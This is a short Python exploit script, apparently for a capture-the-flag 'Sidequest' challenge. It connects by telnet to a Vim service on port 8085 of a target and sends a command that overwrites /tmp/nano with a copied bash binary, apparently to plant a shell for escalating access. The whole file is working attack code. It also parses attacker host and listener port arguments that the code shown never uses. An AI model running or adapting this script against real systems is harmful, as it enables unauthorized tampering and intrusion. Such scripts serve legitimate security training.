# Sidequest4 exploit script
import argparse
import telnetlib
import time



def sendVimCommand(conn, command):
    try:
        conn.write(command.encode('utf-8') + b'\n') 
        time.sleep(1) # Just to make sure everything works fine
        return 200
    except Exception as e:
        with open("logs", 'a') as logfile:
            logfile.write(f'{str(e)}\n--------------------------')
        return 404



def main(address):
    try:
        vimPort = 8085
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/bash | :w! /tmp/nano | :q' # This command opens /tmp/ftp/bash and save (overwrites) as /tmp/nano
        response = sendVimCommand(conn, command)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Command executed")
    finally:
        conn.close()








if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Sidequest 3 pwn script')
    parser.add_argument("--address", "-a", dest = "address", required = True, help = "Server IP Address")
    parser.add_argument("--lhost", "-lh", dest = "lhost", required = True, help = "Attacker Host IP")
    parser.add_argument("--lport", "-lp", dest = "lport", required = True, help = "Attacker Listener Port")
    args = parser.parse_args()
    address = args.address
    lhost = args.lhost
    lport = args.lport
    main(address)

